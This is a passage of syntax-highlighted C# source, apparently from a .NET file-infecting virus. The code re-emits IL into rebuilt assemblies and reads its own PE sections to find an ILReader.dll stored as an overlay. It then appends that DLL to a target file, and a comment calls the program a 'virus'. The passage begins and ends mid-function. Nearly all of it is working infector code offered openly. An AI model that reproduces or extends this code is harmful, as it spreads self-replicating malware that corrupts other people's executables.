                        </span><span class="sc5">case</span><span class="sc0"> </span><span class="sc11">OperandType</span><span class="sc10">.</span><span class="sc11">InlineMethod</span><span class="sc10">:</span><span class="sc0">
                        </span><span class="sc5">case</span><span class="sc0"> </span><span class="sc11">OperandType</span><span class="sc10">.</span><span class="sc11">InlineField</span><span class="sc10">:</span><span class="sc0">
                        </span><span class="sc5">case</span><span class="sc0"> </span><span class="sc11">OperandType</span><span class="sc10">.</span><span class="sc11">InlineType</span><span class="sc10">:</span><span class="sc0">
                        </span><span class="sc5">case</span><span class="sc0"> </span><span class="sc11">OperandType</span><span class="sc10">.</span><span class="sc11">InlineTok</span><span class="sc10">:</span><span class="sc0">
                            </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">operand</span><span class="sc0"> </span><span class="sc5">is</span><span class="sc0"> </span><span class="sc11">Type</span><span class="sc10">)</span><span class="sc0">
                            </span><span class="sc10">{</span><span class="sc0">
                                </span><span class="sc11">TypeBuilder</span><span class="sc0"> </span><span class="sc11">tb</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">objects</span><span class="sc10">.</span><span class="sc11">TypeCompliance</span><span class="sc10">((</span><span class="sc11">Type</span><span class="sc10">)</span><span class="sc11">operand</span><span class="sc10">);</span><span class="sc0">
                                </span><span class="sc5">if</span><span class="sc10">(</span><span class="sc11">tb</span><span class="sc10">!=</span><span class="sc5">null</span><span class="sc10">)</span><span class="sc0">
                                    </span><span class="sc11">il</span><span class="sc10">.</span><span class="sc11">Emit</span><span class="sc10">(</span><span class="sc11">code</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">tb</span><span class="sc10">);</span><span class="sc0">
                                </span><span class="sc5">else</span><span class="sc0">
                                </span><span class="sc10">{</span><span class="sc0">
                                    </span><span class="sc5">if</span><span class="sc10">(((</span><span class="sc11">Type</span><span class="sc10">)</span><span class="sc11">operand</span><span class="sc10">).</span><span class="sc11">Assembly</span><span class="sc10">!=</span><span class="sc11">Assembly</span><span class="sc10">.</span><span class="sc11">GetExecutingAssembly</span><span class="sc10">())</span><span class="sc0">
                                        </span><span class="sc11">il</span><span class="sc10">.</span><span class="sc11">Emit</span><span class="sc10">(</span><span class="sc11">code</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">Type</span><span class="sc10">)</span><span class="sc11">operand</span><span class="sc10">);</span><span class="sc0">
                                    </span><span class="sc5">else</span><span class="sc0"> 
                                        </span><span class="sc5">throw</span><span class="sc0"> </span><span class="sc5">new</span><span class="sc0"> </span><span class="sc11">Exception</span><span class="sc10">();</span><span class="sc0"> 
                                    </span><span class="sc2">// do not emit types &amp; fields from current assembly
</span><span class="sc0">                                </span><span class="sc10">}</span><span class="sc0">
</span><span class="sc9">#if DEBUGCONSOLE
</span><span class="sc0">                                </span><span class="sc11">Console</span><span class="sc10">.</span><span class="sc11">Write</span><span class="sc10">(((</span><span class="sc11">Type</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc11">operand</span><span class="sc10">).</span><span class="sc11">ToString</span><span class="sc10">());</span><span class="sc0">
</span><span class="sc9">#endif
</span><span class="sc0">                            </span><span class="sc10">}</span><span class="sc0">
                            </span><span class="sc5">else</span><span class="sc0"> </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">operand</span><span class="sc0"> </span><span class="sc5">is</span><span class="sc0"> </span><span class="sc11">MethodInfo</span><span class="sc10">)</span><span class="sc0">
                            </span><span class="sc10">{</span><span class="sc0">
                                </span><span class="sc11">MethodInfo</span><span class="sc0"> </span><span class="sc11">methodInfo</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">MethodInfo</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc11">operand</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc9">#if DEBUGCONSOLE
</span><span class="sc0">                                </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">methodInfo</span><span class="sc10">.</span><span class="sc11">DeclaringType</span><span class="sc0"> </span><span class="sc10">!=</span><span class="sc0"> </span><span class="sc5">null</span><span class="sc10">)</span><span class="sc0">
                                </span><span class="sc10">{</span><span class="sc0">
                                    </span><span class="sc11">Console</span><span class="sc10">.</span><span class="sc11">Write</span><span class="sc10">(</span><span class="sc11">methodInfo</span><span class="sc10">.</span><span class="sc11">DeclaringType</span><span class="sc10">);</span><span class="sc0">
                                    </span><span class="sc11">Console</span><span class="sc10">.</span><span class="sc11">Write</span><span class="sc10">(</span><span class="sc6">"::"</span><span class="sc10">);</span><span class="sc0">
                                </span><span class="sc10">}</span><span class="sc0">
                                </span><span class="sc11">Console</span><span class="sc10">.</span><span class="sc11">Write</span><span class="sc10">(</span><span class="sc11">methodInfo</span><span class="sc10">);</span><span class="sc0">
</span><span class="sc9">#endif
</span><span class="sc0">                                </span><span class="sc11">MethodBuilder</span><span class="sc0"> </span><span class="sc11">outMethod</span><span class="sc10">=</span><span class="sc11">objects</span><span class="sc10">.</span><span class="sc11">MethodCompliance</span><span class="sc0">
                                    </span><span class="sc10">(</span><span class="sc11">methodInfo</span><span class="sc10">.</span><span class="sc11">DeclaringType</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">methodInfo</span><span class="sc10">);</span><span class="sc0">
                                </span><span class="sc5">if</span><span class="sc10">(</span><span class="sc11">outMethod</span><span class="sc10">!=</span><span class="sc5">null</span><span class="sc10">)</span><span class="sc0">
                                    </span><span class="sc11">il</span><span class="sc10">.</span><span class="sc11">Emit</span><span class="sc10">(</span><span class="sc11">code</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">outMethod</span><span class="sc10">);</span><span class="sc0">
                                </span><span class="sc5">else</span><span class="sc0">
                                </span><span class="sc10">{</span><span class="sc0">
                                    </span><span class="sc5">if</span><span class="sc10">(</span><span class="sc11">methodInfo</span><span class="sc10">.</span><span class="sc11">DeclaringType</span><span class="sc10">.</span><span class="sc11">Assembly</span><span class="sc10">!=</span><span class="sc11">Assembly</span><span class="sc10">.</span><span class="sc11">GetExecutingAssembly</span><span class="sc10">())</span><span class="sc0">
                                        </span><span class="sc11">il</span><span class="sc10">.</span><span class="sc11">Emit</span><span class="sc10">(</span><span class="sc11">code</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">methodInfo</span><span class="sc10">);</span><span class="sc0">
                                    </span><span class="sc5">else</span><span class="sc0">
                                        </span><span class="sc5">throw</span><span class="sc0"> </span><span class="sc5">new</span><span class="sc0"> </span><span class="sc11">Exception</span><span class="sc10">();</span><span class="sc0">
                                </span><span class="sc10">}</span><span class="sc0">
                            </span><span class="sc10">}</span><span class="sc0">
                            </span><span class="sc5">else</span><span class="sc0"> </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">operand</span><span class="sc0"> </span><span class="sc5">is</span><span class="sc0"> </span><span class="sc11">MemberInfo</span><span class="sc10">)</span><span class="sc0">
                            </span><span class="sc10">{</span><span class="sc0">
                                </span><span class="sc11">MemberInfo</span><span class="sc0"> </span><span class="sc11">memberInfo</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">MemberInfo</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc11">operand</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc9">#if DEBUGCONSOLE
</span><span class="sc0">                                </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">memberInfo</span><span class="sc10">.</span><span class="sc11">DeclaringType</span><span class="sc0"> </span><span class="sc10">!=</span><span class="sc0"> </span><span class="sc5">null</span><span class="sc10">)</span><span class="sc0">
                                </span><span class="sc10">{</span><span class="sc0">
                                    </span><span class="sc11">Console</span><span class="sc10">.</span><span class="sc11">Write</span><span class="sc10">(</span><span class="sc11">memberInfo</span><span class="sc10">.</span><span class="sc11">DeclaringType</span><span class="sc10">);</span><span class="sc0">
                                    </span><span class="sc11">Console</span><span class="sc10">.</span><span class="sc11">Write</span><span class="sc10">(</span><span class="sc6">"::"</span><span class="sc10">);</span><span class="sc0">
                                </span><span class="sc10">}</span><span class="sc0">
                                </span><span class="sc11">Console</span><span class="sc10">.</span><span class="sc11">Write</span><span class="sc10">(</span><span class="sc11">memberInfo</span><span class="sc10">);</span><span class="sc0">
</span><span class="sc9">#endif
</span><span class="sc0">                                </span><span class="sc5">if</span><span class="sc10">(</span><span class="sc11">operand</span><span class="sc0"> </span><span class="sc5">is</span><span class="sc0"> </span><span class="sc11">FieldInfo</span><span class="sc10">)</span><span class="sc0">
                                </span><span class="sc10">{</span><span class="sc0">
                                    </span><span class="sc11">FieldBuilder</span><span class="sc0"> </span><span class="sc11">outField</span><span class="sc10">=</span><span class="sc11">objects</span><span class="sc10">.</span><span class="sc11">FieldCompliance</span><span class="sc0">
                                        </span><span class="sc10">(((</span><span class="sc11">FieldInfo</span><span class="sc10">)</span><span class="sc11">operand</span><span class="sc10">).</span><span class="sc11">DeclaringType</span><span class="sc10">,</span><span class="sc0"> 
                                        </span><span class="sc10">(</span><span class="sc11">FieldInfo</span><span class="sc10">)</span><span class="sc11">operand</span><span class="sc10">);</span><span class="sc0">
                                    </span><span class="sc5">if</span><span class="sc10">(</span><span class="sc11">outField</span><span class="sc10">!=</span><span class="sc5">null</span><span class="sc10">)</span><span class="sc0">
                                        </span><span class="sc11">il</span><span class="sc10">.</span><span class="sc11">Emit</span><span class="sc10">(</span><span class="sc11">code</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">outField</span><span class="sc10">);</span><span class="sc0">
                                    </span><span class="sc5">else</span><span class="sc0">
                                    </span><span class="sc10">{</span><span class="sc0">
                                        </span><span class="sc5">if</span><span class="sc10">(((</span><span class="sc11">FieldInfo</span><span class="sc10">)</span><span class="sc11">operand</span><span class="sc10">).</span><span class="sc11">DeclaringType</span><span class="sc10">.</span><span class="sc11">Assembly</span><span class="sc10">!=</span><span class="sc11">Assembly</span><span class="sc10">.</span><span class="sc11">GetExecutingAssembly</span><span class="sc10">())</span><span class="sc0">
                                            </span><span class="sc11">il</span><span class="sc10">.</span><span class="sc11">Emit</span><span class="sc10">(</span><span class="sc11">code</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">FieldInfo</span><span class="sc10">)</span><span class="sc11">operand</span><span class="sc10">);</span><span class="sc0">
                                        </span><span class="sc5">else</span><span class="sc0">
                                            </span><span class="sc5">throw</span><span class="sc0"> </span><span class="sc5">new</span><span class="sc0"> </span><span class="sc11">Exception</span><span class="sc10">();</span><span class="sc0">
                                    </span><span class="sc10">}</span><span class="sc0">
                                    
                                </span><span class="sc10">}</span><span class="sc0">
                                </span><span class="sc5">if</span><span class="sc10">(</span><span class="sc11">operand</span><span class="sc0"> </span><span class="sc5">is</span><span class="sc0"> </span><span class="sc11">ConstructorInfo</span><span class="sc10">)</span><span class="sc0">
                                </span><span class="sc10">{</span><span class="sc0">
                                    </span><span class="sc11">ConstructorInfo</span><span class="sc0"> </span><span class="sc11">cin</span><span class="sc10">=(</span><span class="sc11">ConstructorInfo</span><span class="sc10">)</span><span class="sc11">operand</span><span class="sc10">;</span><span class="sc0">
                                    </span><span class="sc11">ConstructorBuilder</span><span class="sc0"> </span><span class="sc11">cout</span><span class="sc10">=</span><span class="sc11">objects</span><span class="sc10">.</span><span class="sc11">ConstructorCompliance</span><span class="sc0">
                                        </span><span class="sc10">(</span><span class="sc11">cin</span><span class="sc10">.</span><span class="sc11">DeclaringType</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">cin</span><span class="sc10">);</span><span class="sc0">
                                    </span><span class="sc5">if</span><span class="sc10">(</span><span class="sc11">cout</span><span class="sc10">!=</span><span class="sc5">null</span><span class="sc10">)</span><span class="sc0">
                                        </span><span class="sc11">il</span><span class="sc10">.</span><span class="sc11">Emit</span><span class="sc10">(</span><span class="sc11">code</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">cout</span><span class="sc10">);</span><span class="sc0">
                                    </span><span class="sc5">else</span><span class="sc0">
                                    </span><span class="sc10">{</span><span class="sc0">
                                        </span><span class="sc5">if</span><span class="sc10">(</span><span class="sc11">cin</span><span class="sc10">.</span><span class="sc11">DeclaringType</span><span class="sc10">.</span><span class="sc11">Assembly</span><span class="sc10">!=</span><span class="sc11">Assembly</span><span class="sc10">.</span><span class="sc11">GetExecutingAssembly</span><span class="sc10">())</span><span class="sc0">
                                            </span><span class="sc11">il</span><span class="sc10">.</span><span class="sc11">Emit</span><span class="sc10">(</span><span class="sc11">code</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">cin</span><span class="sc10">);</span><span class="sc0">
                                        </span><span class="sc5">else</span><span class="sc0">
                                            </span><span class="sc5">throw</span><span class="sc0"> </span><span class="sc5">new</span><span class="sc0"> </span><span class="sc11">Exception</span><span class="sc10">();</span><span class="sc0">
                                    </span><span class="sc10">}</span><span class="sc0">
                                    
                                </span><span class="sc10">}</span><span class="sc0">
                            </span><span class="sc10">}</span><span class="sc0">
                            </span><span class="sc5">else</span><span class="sc0"> </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">operand</span><span class="sc0"> </span><span class="sc5">is</span><span class="sc0"> </span><span class="sc11">FieldInfo</span><span class="sc10">)</span><span class="sc0">
                            </span><span class="sc10">{</span><span class="sc0">
                                </span><span class="sc11">FieldInfo</span><span class="sc0"> </span><span class="sc11">fieldInfo</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">FieldInfo</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc11">operand</span><span class="sc10">;</span><span class="sc0">
                            </span><span class="sc10">}</span><span class="sc0">
                            </span><span class="sc5">else</span><span class="sc0">
                            </span><span class="sc10">{</span><span class="sc0">
                                </span><span class="sc5">throw</span><span class="sc0"> </span><span class="sc5">new</span><span class="sc0"> </span><span class="sc11">Exception</span><span class="sc10">();</span><span class="sc0">
                            </span><span class="sc10">}</span><span class="sc0">
                            </span><span class="sc5">break</span><span class="sc10">;</span><span class="sc0">
                    </span><span class="sc10">}</span><span class="sc0">
                </span><span class="sc10">}</span><span class="sc0">
                </span><span class="sc5">else</span><span class="sc0">
                </span><span class="sc10">{</span><span class="sc0">
                    </span><span class="sc11">il</span><span class="sc10">.</span><span class="sc11">Emit</span><span class="sc10">(</span><span class="sc11">code</span><span class="sc10">);</span><span class="sc0">
</span><span class="sc9">#if DEBUGCONSOLE
</span><span class="sc0">                    </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">operandData</span><span class="sc0"> </span><span class="sc10">!=</span><span class="sc0"> </span><span class="sc5">null</span><span class="sc10">)</span><span class="sc0">
                    </span><span class="sc10">{</span><span class="sc0">
                        </span><span class="sc11">Console</span><span class="sc10">.</span><span class="sc11">Write</span><span class="sc10">(</span><span class="sc6">"null"</span><span class="sc10">);</span><span class="sc0">
                        </span><span class="sc11">Console</span><span class="sc10">.</span><span class="sc11">Write</span><span class="sc10">(</span><span class="sc6">" // "</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc11">instruction</span><span class="sc10">.</span><span class="sc11">Code</span><span class="sc10">.</span><span class="sc11">OperandType</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc6">" "</span><span class="sc10">);</span><span class="sc0">
                        </span><span class="sc5">foreach</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc16">byte</span><span class="sc0"> </span><span class="sc11">b</span><span class="sc0"> </span><span class="sc5">in</span><span class="sc0"> </span><span class="sc11">operandData</span><span class="sc10">)</span><span class="sc0"> 
                            </span><span class="sc11">Console</span><span class="sc10">.</span><span class="sc11">Write</span><span class="sc10">(</span><span class="sc11">b</span><span class="sc10">.</span><span class="sc11">ToString</span><span class="sc10">(</span><span class="sc6">"X2"</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc6">" "</span><span class="sc10">);</span><span class="sc0">
                    </span><span class="sc10">}</span><span class="sc0">
</span><span class="sc9">#endif
</span><span class="sc0">                </span><span class="sc10">}</span><span class="sc0">      

</span><span class="sc9">#if DEBUGCONSOLE
</span><span class="sc0">                </span><span class="sc11">Console</span><span class="sc10">.</span><span class="sc11">WriteLine</span><span class="sc10">();</span><span class="sc0">
</span><span class="sc9">#endif
</span><span class="sc0">            </span><span class="sc10">}</span><span class="sc0">



        </span><span class="sc10">}</span><span class="sc0">

        </span><span class="sc5">private</span><span class="sc0"> </span><span class="sc16">static</span><span class="sc0"> </span><span class="sc16">byte</span><span class="sc0"> </span><span class="sc10">[]</span><span class="sc0"> </span><span class="sc11">GetILReader</span><span class="sc10">()</span><span class="sc0">
        </span><span class="sc10">{</span><span class="sc0">
            </span><span class="sc11">FileStream</span><span class="sc0"> </span><span class="sc11">selfStream</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">Assembly</span><span class="sc10">.</span><span class="sc11">GetExecutingAssembly</span><span class="sc10">().</span><span class="sc11">GetFiles</span><span class="sc10">()[</span><span class="sc4">0</span><span class="sc10">];</span><span class="sc0">
            </span><span class="sc11">BinaryReader</span><span class="sc0"> </span><span class="sc11">selfReader</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc5">new</span><span class="sc0"> </span><span class="sc11">BinaryReader</span><span class="sc10">(</span><span class="sc11">selfStream</span><span class="sc10">);</span><span class="sc0">
            </span><span class="sc11">MSDOSHeader</span><span class="sc0"> </span><span class="sc11">selfmsdosheader</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc5">new</span><span class="sc0"> </span><span class="sc11">MSDOSHeader</span><span class="sc10">();</span><span class="sc0">
            </span><span class="sc11">selfmsdosheader</span><span class="sc10">.</span><span class="sc11">Read</span><span class="sc10">(</span><span class="sc11">selfReader</span><span class="sc10">);</span><span class="sc0">
            </span><span class="sc11">PEHeader</span><span class="sc0"> </span><span class="sc11">selfpeheader</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc5">new</span><span class="sc0"> </span><span class="sc11">PEHeader</span><span class="sc10">();</span><span class="sc0">
            </span><span class="sc11">selfpeheader</span><span class="sc10">.</span><span class="sc11">Read</span><span class="sc10">(</span><span class="sc11">selfReader</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">selfmsdosheader</span><span class="sc10">);</span><span class="sc0">
            </span><span class="sc11">SectionHeader</span><span class="sc0"> </span><span class="sc11">lastSection</span><span class="sc10">=((</span><span class="sc11">SectionHeader</span><span class="sc10">)</span><span class="sc11">selfpeheader</span><span class="sc10">.</span><span class="sc0">
                </span><span class="sc11">sectionHeaders</span><span class="sc10">[</span><span class="sc11">selfpeheader</span><span class="sc10">.</span><span class="sc11">sectionHeaders</span><span class="sc10">.</span><span class="sc11">Count</span><span class="sc10">-</span><span class="sc4">1</span><span class="sc10">]);</span><span class="sc0">
            
            </span><span class="sc16">uint</span><span class="sc0"> </span><span class="sc11">physOffs</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">lastSection</span><span class="sc10">.</span><span class="sc11">pointerToRawData</span><span class="sc10">+</span><span class="sc11">lastSection</span><span class="sc10">.</span><span class="sc11">sizeOfRawData</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc9">#if DEBUGCONSOLE
</span><span class="sc0">            </span><span class="sc11">Console</span><span class="sc10">.</span><span class="sc11">WriteLine</span><span class="sc10">(</span><span class="sc6">"ILReader offset in host "</span><span class="sc10">+</span><span class="sc11">physOffs</span><span class="sc10">);</span><span class="sc0">
</span><span class="sc9">#endif
</span><span class="sc0">            </span><span class="sc11">selfReader</span><span class="sc10">.</span><span class="sc11">BaseStream</span><span class="sc10">.</span><span class="sc11">Position</span><span class="sc10">=</span><span class="sc11">physOffs</span><span class="sc10">;</span><span class="sc0">
            </span><span class="sc16">byte</span><span class="sc0"> </span><span class="sc10">[]</span><span class="sc0"> </span><span class="sc11">buf</span><span class="sc10">;</span><span class="sc0">
            </span><span class="sc5">try</span><span class="sc0">
            </span><span class="sc10">{</span><span class="sc0">
                </span><span class="sc2">// extract ILReader.dll that is added to virus as overlay 
</span><span class="sc0">                </span><span class="sc16">uint</span><span class="sc0"> </span><span class="sc11">len</span><span class="sc10">=</span><span class="sc11">selfReader</span><span class="sc10">.</span><span class="sc11">ReadUInt32</span><span class="sc10">();</span><span class="sc0">
</span><span class="sc9">#if DEBUGCONSOLE
</span><span class="sc0">                </span><span class="sc11">Console</span><span class="sc10">.</span><span class="sc11">WriteLine</span><span class="sc10">(</span><span class="sc6">"ILReader length in host "</span><span class="sc10">+</span><span class="sc11">len</span><span class="sc10">);</span><span class="sc0">
</span><span class="sc9">#endif
</span><span class="sc0">                </span><span class="sc11">buf</span><span class="sc10">=</span><span class="sc11">selfReader</span><span class="sc10">.</span><span class="sc11">ReadBytes</span><span class="sc10">((</span><span class="sc16">int</span><span class="sc10">)</span><span class="sc11">len</span><span class="sc10">);</span><span class="sc0">
                </span><span class="sc11">selfStream</span><span class="sc10">.</span><span class="sc11">Close</span><span class="sc10">();</span><span class="sc0">
                </span><span class="sc5">return</span><span class="sc0"> </span><span class="sc11">buf</span><span class="sc10">;</span><span class="sc0">
            </span><span class="sc10">}</span><span class="sc0">
            </span><span class="sc5">catch</span><span class="sc0">
            </span><span class="sc10">{</span><span class="sc0">
                </span><span class="sc2">// otherwise get data from file
</span><span class="sc0">                </span><span class="sc11">selfStream</span><span class="sc10">.</span><span class="sc11">Close</span><span class="sc10">();</span><span class="sc0">
</span><span class="sc9">#if DEBUGCONSOLE
</span><span class="sc0">                </span><span class="sc11">Console</span><span class="sc10">.</span><span class="sc11">WriteLine</span><span class="sc10">(</span><span class="sc6">"Cannot find DLL in host, trying to find it in current dir"</span><span class="sc10">);</span><span class="sc0">
</span><span class="sc9">#endif
</span><span class="sc0">                </span><span class="sc11">FileStream</span><span class="sc0"> </span><span class="sc11">ilStream</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc5">new</span><span class="sc0"> </span><span class="sc11">FileStream</span><span class="sc10">(</span><span class="sc6">"ILReader.dll"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">FileMode</span><span class="sc10">.</span><span class="sc11">Open</span><span class="sc10">,</span><span class="sc0">
                    </span><span class="sc11">FileAccess</span><span class="sc10">.</span><span class="sc11">Read</span><span class="sc10">);</span><span class="sc0">
                </span><span class="sc11">BinaryReader</span><span class="sc0"> </span><span class="sc11">ilReader</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc5">new</span><span class="sc0"> </span><span class="sc11">BinaryReader</span><span class="sc10">(</span><span class="sc11">ilStream</span><span class="sc10">);</span><span class="sc0">
                </span><span class="sc11">FileInfo</span><span class="sc0"> </span><span class="sc11">fi</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc5">new</span><span class="sc0"> </span><span class="sc11">FileInfo</span><span class="sc10">(</span><span class="sc6">"ILReader.dll"</span><span class="sc10">);</span><span class="sc0">
                </span><span class="sc5">if</span><span class="sc10">(</span><span class="sc11">fi</span><span class="sc10">!=</span><span class="sc5">null</span><span class="sc10">)</span><span class="sc0">
                </span><span class="sc10">{</span><span class="sc0">
                    </span><span class="sc11">buf</span><span class="sc10">=</span><span class="sc11">ilReader</span><span class="sc10">.</span><span class="sc11">ReadBytes</span><span class="sc10">((</span><span class="sc16">int</span><span class="sc10">)</span><span class="sc11">fi</span><span class="sc10">.</span><span class="sc11">Length</span><span class="sc10">);</span><span class="sc0">
</span><span class="sc9">#if DEBUGCONSOLE
</span><span class="sc0">                    </span><span class="sc11">Console</span><span class="sc10">.</span><span class="sc11">WriteLine</span><span class="sc10">(</span><span class="sc11">fi</span><span class="sc10">.</span><span class="sc11">Length</span><span class="sc10">+</span><span class="sc6">"bytes read"</span><span class="sc10">);</span><span class="sc0">
</span><span class="sc9">#endif
</span><span class="sc0">                    </span><span class="sc11">ilStream</span><span class="sc10">.</span><span class="sc11">Close</span><span class="sc10">();</span><span class="sc0">
                    </span><span class="sc5">return</span><span class="sc0"> </span><span class="sc11">buf</span><span class="sc10">;</span><span class="sc0">
                </span><span class="sc10">}</span><span class="sc0">
                </span><span class="sc5">else</span><span class="sc0">
                </span><span class="sc10">{</span><span class="sc0">
                    </span><span class="sc11">ilStream</span><span class="sc10">.</span><span class="sc11">Close</span><span class="sc10">();</span><span class="sc0">
                    </span><span class="sc5">return</span><span class="sc0"> </span><span class="sc5">null</span><span class="sc10">;</span><span class="sc0">
                </span><span class="sc10">}</span><span class="sc0">
            </span><span class="sc10">}</span><span class="sc0">
        </span><span class="sc10">}</span><span class="sc0">

        </span><span class="sc5">private</span><span class="sc0"> </span><span class="sc16">static</span><span class="sc0"> </span><span class="sc16">void</span><span class="sc0"> </span><span class="sc11">AddILReader</span><span class="sc10">(</span><span class="sc16">string</span><span class="sc0"> </span><span class="sc11">fileName</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc16">byte</span><span class="sc0"> </span><span class="sc10">[]</span><span class="sc0"> </span><span class="sc11">ilReader</span><span class="sc10">)</span><span class="sc0">
        </span><span class="sc10">{</span><span class="sc0">
            </span><span class="sc11">FileStream</span><span class="sc0"> </span><span class="sc11">outStream</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc5">new</span><span class="sc0"> </span><span class="sc11">FileStream</span><span class="sc10">(</span><span class="sc11">fileName</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">FileMode</span><span class="sc10">.</span><span class="sc11">Open</span><span class="sc10">,</span><span class="sc0">
                </span><span class="sc11">FileAccess</span><span class="sc10">.</span><span class="sc11">ReadWrite</span><span class="sc10">);</span><span class="sc0">
            </span><span class="sc11">BinaryWriter</span><span class="sc0"> </span><span class="sc11">outWriter</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc5">new</span><span class="sc0"> </span><span class="sc11">BinaryWriter</span><span class="sc10">(</span><span class="sc11">outStream</span><span class="sc10">);</span><span class="sc0">
            </span><span class="sc11">outWriter</span><span class="sc10">.</span><span class="sc11">BaseStream</span><span class="sc10">.</span><span class="sc11">Seek</span><span class="sc10">(</span><span class="sc4">0</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">SeekOrigin</span><span class="sc10">.</span><span class="sc11">End</span><span class="sc10">);</span><span class="sc0">
            </span><span class="sc11">outWriter</span><span class="sc10">.</span><span class="sc11">Write</span><span class="sc10">((</span><span class="sc16">uint</span><span class="sc10">)(</span><span class="sc11">ilReader</span><span class="sc10">.</span><span class="sc11">Length</span><span class="sc10">));</span><span class="sc0">
</span><span class="sc9">#if DEBUGCONSOLE
</span><span class="sc0">            </span><span class="sc11">Console</span><span class="sc10">.</span><span class="sc11">WriteLine</span><span class="sc10">(</span><span class="sc6">"Written length "</span><span class="sc10">+</span><span class="sc11">ilReader</span><span class="sc10">.</span><span class="sc11">Length</span><span class="sc10">);</span><span class="sc0">
</span><span class="sc9">#endif
</span><span class="sc0">            </span><span class="sc11">outWriter</span><span class="sc10">.</span><span class="sc11">Write</span><span class="sc10">(</span><span class="sc11">ilReader</span><span class="sc10">);</span><span class="sc0">
</span><span class="sc9">#if DEBUGCONSOLE
</span><span class="sc0">            </span><span class="sc11">Console</span><span class="sc10">.</span><span class="sc11">WriteLine</span><span class="sc10">(</span><span class="sc6">"Written ILReader.dll"</span><span class="sc10">);</span><span class="sc0">
</span><span class="sc9">#endif
</span><span class="sc0">            </span><span class="sc11">outStream</span><span class="sc10">.</span><span class="sc11">Close</span><span class="sc10">();</span><span class="sc0">
        </span><span class="sc10">}</span><span class="sc0">

        </span><span class="sc5">private</span><span class="sc0"> </span><span class="sc16">static</span><span class="sc0"> </span><span class="sc16">bool</span><span class="sc0"> </span><span class="sc11">CopyUnmanagedResources</span><span class="sc10">(</span><span class="sc16">string</span><span class="sc0"> </span><span class="sc11">inFileName</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc16">string</span><span class="sc0"> </span><span class="sc11">outFileName</span><span class="sc10">)</span><span class="sc0">
        </span><span class="sc10">{</span><span class="sc0">
            </span><span class="sc11">FileStream</span><span class="sc0"> </span><span class="sc11">outStream</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc5">new</span><span class="sc0"> </span><span class="sc11">FileStream</span><span class="sc10">(</span><span class="sc11">outFileName</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">FileMode</span><span class="sc10">.</span><span class="sc11">Open</span><span class="sc10">,</span><span class="sc0">
                </span><span class="sc11">FileAccess</span><span class="sc10">.</span><span class="sc11">ReadWrite</span><span class="sc10">);</span><span class="sc0">
            </span><span class="sc11">FileStream</span><span class="sc0"> </span><span class="sc11">inStream</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc5">new</span><span class="sc0"> </span><span class="sc11">FileStream</span><span class="sc10">(</span><span class="sc11">inFileName</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">FileMode</span><span class="sc10">.</span><span class="sc11">Open</span><span class="sc10">,</span><span class="sc0">
                </span><span class="sc11">FileAccess</span><span class="sc10">.</span><span class="sc11">Read</span><span class="sc10">);</span><span class="sc0">
            </span><span class="sc5">if</span><span class="sc10">(</span><span class="sc11">inStream</span><span class="sc10">==</span><span class="sc5">null</span><span class="sc0"> </span><span class="sc10">||</span><span class="sc0"> </span><span class="sc11">outStream</span><span class="sc10">==</span><span class="sc5">null</span><span class="sc10">)</span><span class="sc0">
